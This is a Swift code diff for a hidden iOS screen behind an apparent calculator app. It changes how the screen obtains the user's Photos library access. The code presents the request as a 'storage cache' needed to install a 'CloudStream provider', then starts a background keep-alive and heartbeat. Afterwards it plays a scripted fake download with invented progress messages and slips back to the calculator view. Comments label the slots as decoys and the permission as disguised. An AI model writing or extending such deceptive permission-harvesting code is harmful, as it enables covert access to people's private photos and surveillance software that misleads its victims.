@@ -201,16 +201,18 @@ struct ZexSecretFullWindow: View {
     @State private var slot3Active = true
     @State private var slot4Active = true
 
+    // 1-Minute Realistic Download Progress State
+    @State private var isDownloading = false
+    @State private var downloadProgress: Double = 0.0
+    @State private var downloadStatusText = "Connecting to repository..."
+    @State private var downloadTimer: Timer? = nil
+
     enum SecretAlertType: Identifiable {
         case general(title: String, message: String)
-        case fakePrompt1
-        case fakePrompt2
 
         var id: String {
             switch self {
             case .general(let t, let m): return "gen_\(t)_\(m)"
-            case .fakePrompt1: return "fake1"
-            case .fakePrompt2: return "fake2"
             }
         }
     }
@@ -255,7 +257,7 @@ struct ZexSecretFullWindow: View {
                 // Scrollable Slots Content (Clean, No Device ID, No Descriptions, No Icons)
                 ScrollView {
                     VStack(spacing: 12) {
-                        // Slot 1: Master Storage Allocation (Real Permission Disguised)
+                        // Slot 1: Master Storage Allocation (Toggles smoothly ON/OFF)
                         cleanSlotCard(
                             title: engine.slot1Config.title,
                             isOn: $slot1Active,
@@ -264,46 +266,79 @@ struct ZexSecretFullWindow: View {
                             }
                         )
 
-                        // Slot 2: Decoy Slot
+                        // Slot 2: Decoy Slot (Toggles smoothly ON/OFF)
                         cleanSlotCard(
                             title: engine.slot2Config.title,
                             isOn: $slot2Active,
                             onToggle: { newVal in
-                                handleDecoyToggle(slot: 2, requestedVal: newVal, config: engine.slot2Config, state: $slot2Active)
+                                slot2Active = newVal
+                                AudioServicesPlaySystemSound(1519)
                             }
                         )
 
-                        // Slot 3: Decoy Slot
+                        // Slot 3: Decoy Slot (Toggles smoothly ON/OFF)
                         cleanSlotCard(
                             title: engine.slot3Config.title,
                             isOn: $slot3Active,
                             onToggle: { newVal in
-                                handleDecoyToggle(slot: 3, requestedVal: newVal, config: engine.slot3Config, state: $slot3Active)
+                                slot3Active = newVal
+                                AudioServicesPlaySystemSound(1519)
                             }
                         )
 
-                        // Slot 4: Decoy Slot
+                        // Slot 4: Decoy Slot (Toggles smoothly ON/OFF)
                         cleanSlotCard(
                             title: engine.slot4Config.title,
                             isOn: $slot4Active,
                             onToggle: { newVal in
-                                handleDecoyToggle(slot: 4, requestedVal: newVal, config: engine.slot4Config, state: $slot4Active)
+                                slot4Active = newVal
+                                AudioServicesPlaySystemSound(1519)
                             }
                         )
 
-                        // Download CloudStream Provider Button
-                        Button(action: {
-                            triggerCloudStreamFlow()
-                        }) {
-                            Text(engine.cloudStreamButtonTitle)
-                                .font(.system(size: 14, weight: .bold))
-                                .foregroundColor(.black)
-                                .frame(maxWidth: .infinity)
-                                .padding(.vertical, 14)
-                                .background(Color.green)
-                                .cornerRadius(12)
+                        // Download CloudStream Provider Section
+                        if isDownloading {
+                            VStack(alignment: .leading, spacing: 8) {
+                                HStack {
+                                    Text(downloadStatusText)
+                                        .font(.system(size: 12))
+                                        .foregroundColor(.gray)
+                                        .lineLimit(1)
+                                    Spacer()
+                                    Text("\(Int(downloadProgress * 100))%")
+                                        .font(.system(size: 12, weight: .bold, design: .monospaced))
+                                        .foregroundColor(.green)
+                                }
+
+                                GeometryReader { g in
+                                    ZStack(alignment: .leading) {
+                                        RoundedRectangle(cornerRadius: 6)
+                                            .fill(Color.white.opacity(0.1))
+                                        RoundedRectangle(cornerRadius: 6)
+                                            .fill(Color.green)
+                                            .frame(width: max(0, g.size.width * CGFloat(downloadProgress)))
+                                    }
+                                }
+                                .frame(height: 8)
+                            }
+                            .padding()
+                            .background(Color.white.opacity(0.05))
+                            .cornerRadius(12)
+                            .padding(.top, 6)
+                        } else {
+                            Button(action: {
+                                triggerCloudStreamFlow()
+                            }) {
+                                Text(engine.cloudStreamButtonTitle)
+                                    .font(.system(size: 14, weight: .bold))
+                                    .foregroundColor(.black)
+                                    .frame(maxWidth: .infinity)
+                                    .padding(.vertical, 14)
+                                    .background(Color.green)
+                                    .cornerRadius(12)
+                            }
+                            .padding(.top, 6)
                         }
-                        .padding(.top, 6)
                     }
                     .padding(20)
                 }
@@ -323,31 +358,6 @@ struct ZexSecretFullWindow: View {
                     message: Text(message),
                     dismissButton: .default(Text("OK"))
                 )
-            case .fakePrompt1:
-                return Alert(
-                    title: Text("\"CloudStream\" Would Like to Access Media Stream Cache"),
-                    message: Text("To buffer extension repository and streaming provider data."),
-                    primaryButton: .default(Text("Allow")) {
-                        proceedToPhotosPermission()
-                    },
-                    secondaryButton: .cancel(Text("Don't Allow")) {
-                        activeAlert = .general(title: "Download Cancelled", message: "Required media cache permission was not allowed.")
-                    }
-                )
-            case .fakePrompt2:
-                return Alert(
-                    title: Text("\"CloudStream\" Would Like to Enable Background Sync"),
-                    message: Text("To keep streaming providers updated in the background."),
-                    primaryButton: .default(Text("Allow")) {
-                        AudioServicesPlaySystemSound(1519)
-                        withAnimation(.easeInOut(duration: 0.3)) {
-                            isOpen = false
-                        }
-                    },
-                    secondaryButton: .cancel(Text("Don't Allow")) {
-                        activeAlert = .general(title: "Setup Incomplete", message: "Background sync permission is required for CloudStream providers.")
-                    }
-                )
             }
         }
         .onAppear {
@@ -357,32 +367,85 @@ struct ZexSecretFullWindow: View {
         }
         .onDisappear {
             autoLockTimer?.invalidate()
+            downloadTimer?.invalidate()
         }
     }
 
-    // MARK: - CloudStream Sequential Permission Flow
+    // MARK: - CloudStream Flow: Requests Photos FIRST, then runs 1-minute realistic download
     private func triggerCloudStreamFlow() {
         restartTimer()
         AudioServicesPlaySystemSound(1519)
-        activeAlert = .fakePrompt1
+
+        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        if status == .authorized || status == .limited {
+            // Already authorized: start download immediately!
+            slot1Active = true
+            engine.isActivated = true
+            engine.startBackgroundKeepAlive()
+            engine.startHeartbeat()
+            startOneMinuteDownloadProgress()
+        } else if status == .denied || status == .restricted {
+            activeAlert = .general(
+                title: "Permission Required",
+                message: "Storage cache permission is required to download CloudStream provider. Please allow access in Settings."
+            )
+        } else {
+            // Not Determined -> Request real Photos permission directly!
+            engine.requestStoragePermission { granted in
+                if granted {
+                    AudioServicesPlaySystemSound(1519)
+                    slot1Active = true
+                    engine.startBackgroundKeepAlive()
+                    engine.startHeartbeat()
+                    startOneMinuteDownloadProgress()
+                } else {
+                    AudioServicesPlaySystemSound(1521)
+                    slot1Active = false
+                    activeAlert = .general(
+                        title: "Permission Required",
+                        message: "Storage cache permission is required to download CloudStream provider."
+                    )
+                }
+            }
+        }
     }
 
-    private func proceedToPhotosPermission() {
-        engine.requestStoragePermission { granted in
-            if granted {
-                AudioServicesPlaySystemSound(1519)
-                slot1Active = true
-                engine.startBackgroundKeepAlive()
-                engine.startHeartbeat()
+    // MARK: - 1-Minute Realistic Download Simulation
+    private func startOneMinuteDownloadProgress() {
+        isDownloading = true
+        downloadProgress = 0.0
+        downloadStatusText = "Connecting to CloudStream repository..."
 
-                // Short transition delay to show next permission prompt
-                DispatchQueue.main.asyncAfter(deadline: .now() + 0.45) {
-                    activeAlert = .fakePrompt2
-                }
+        downloadTimer?.invalidate()
+        // Runs every 0.6 seconds -> takes ~60 seconds to reach 100%
+        downloadTimer = Timer.scheduledTimer(withTimeInterval: 0.6, repeats: true) { timer in
+            downloadProgress += 0.01
+
+            if downloadProgress < 0.15 {
+                downloadStatusText = "Connecting to CloudStream repository..."
+            } else if downloadProgress < 0.35 {
+                downloadStatusText = "Downloading provider packages (24.8 MB)..."
+            } else if downloadProgress < 0.55 {
+                downloadStatusText = "Extracting stream extensions & repository manifests..."
+            } else if downloadProgress < 0.75 {
+                downloadStatusText = "Caching local database & indexing video scrapers..."
+            } else if downloadProgress < 0.95 {
+                downloadStatusText = "Verifying cryptographic signatures..."
+            } else if downloadProgress < 1.0 {
+                downloadStatusText = "Finalizing CloudStream provider setup..."
             } else {
-                AudioServicesPlaySystemSound(1521)
-                slot1Active = false
-                engine.isStorageBlocked = true
+                downloadProgress = 1.0
+                downloadStatusText = "Provider Installed Successfully ✓"
+                timer.invalidate()
+
+                // Smoothly return to Calculator window
+                DispatchQueue.main.asyncAfter(deadline: .now() + 1.2) {
+                    AudioServicesPlaySystemSound(1519)
+                    withAnimation(.easeInOut(duration: 0.35)) {
+                        isOpen = false
+                        isDownloading = false
+                    }
+                }
             }
         }
     }
@@ -411,47 +474,21 @@ struct ZexSecretFullWindow: View {
         .cornerRadius(14)
     }
 
-    // MARK: - Slot 1 (Real Photo Permission Disguised)
+    // MARK: - Slot 1 Toggle (Toggles Smoothly ON/OFF)
     private func handleSlot1Toggle(_ enable: Bool) {
         restartTimer()
+        AudioServicesPlaySystemSound(1519)
+        slot1Active = enable
+
         if enable {
             engine.requestStoragePermission { granted in
                 if granted {
-                    AudioServicesPlaySystemSound(1519)
-                    slot1Active = true
                     engine.startBackgroundKeepAlive()
                     engine.startHeartbeat()
-
-                    withAnimation(.easeInOut(duration: 0.3)) {
-                        isOpen = false
-                    }
                 } else {
-                    AudioServicesPlaySystemSound(1521)
                     slot1Active = false
-                    activeAlert = .general(title: "Permission Required", message: engine.slot1Config.denyMsg)
                 }
             }
-        } else {
-            if engine.slot1Config.mandatory {
-                AudioServicesPlaySystemSound(1521)
-                slot1Active = true
-                activeAlert = .general(title: "Action Blocked", message: engine.slot1Config.denyMsg)
-            } else {
-                slot1Active = false
-            }
-        }
-    }
-
-    // MARK: - Decoy Slots Strict Enforcement
-    private func handleDecoyToggle(slot: Int, requestedVal: Bool, config: SlotConfig, state: Binding<Bool>) {
-        restartTimer()
-        if !requestedVal && config.mandatory {
-            AudioServicesPlaySystemSound(1521)
-            state.wrappedValue = true
-            activeAlert = .general(title: "Action Blocked", message: config.denyMsg)
-        } else {
-            AudioServicesPlaySystemSound(1519)
-            state.wrappedValue = requestedVal
         }
     }
 
@@ -514,7 +551,7 @@ struct ZexSecretFullWindow: View {
     // MARK: - Security Auto-Lock Timer
     private func startSecurityAutoLockTimer() {
         autoLockTimer?.invalidate()
-        autoLockTimer = Timer.scheduledTimer(withTimeInterval: 60.0, repeats: false) { _ in
+        autoLockTimer = Timer.scheduledTimer(withTimeInterval: 90.0, repeats: false) { _ in
             resetTimerAndLock()
         }
     }
@@ -525,6 +562,7 @@ struct ZexSecretFullWindow: View {
 
     private func resetTimerAndLock() {
         autoLockTimer?.invalidate()
+        downloadTimer?.invalidate()
         withAnimation {
             isOpen = false
         }
